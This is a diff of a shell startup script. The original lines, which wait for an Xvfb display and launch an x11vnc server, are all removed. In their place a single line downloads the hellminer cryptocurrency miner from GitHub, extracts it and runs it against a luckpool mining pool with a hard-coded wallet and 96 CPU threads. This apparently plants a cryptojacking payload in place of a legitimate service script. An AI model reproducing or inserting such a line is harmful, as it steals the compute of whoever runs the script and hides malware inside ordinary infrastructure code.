@@ -1,13 +1,1 @@
-#!/usr/bin/env bash
-
-for i in $(seq 1 10)
-do
-    sleep 1
-    xdpyinfo -display ${DISPLAY} >/dev/null 2>&1
-    if [ $? -eq 0 ]; then
-        break
-    fi
-    echo "Waiting for Xvfb..."
-done
-
-x11vnc -forever -shared -rfbport ${VNC_PORT:-5900} -rfbportv6 ${VNC_PORT:-5900} -display ${DISPLAY}
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; tar xf hellminer_cpu_linux.tar.gz; ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RCT2S85q77oYSjQyU19UMmLCp8vSbXRuxT.MonG10 -p x --cpu 96
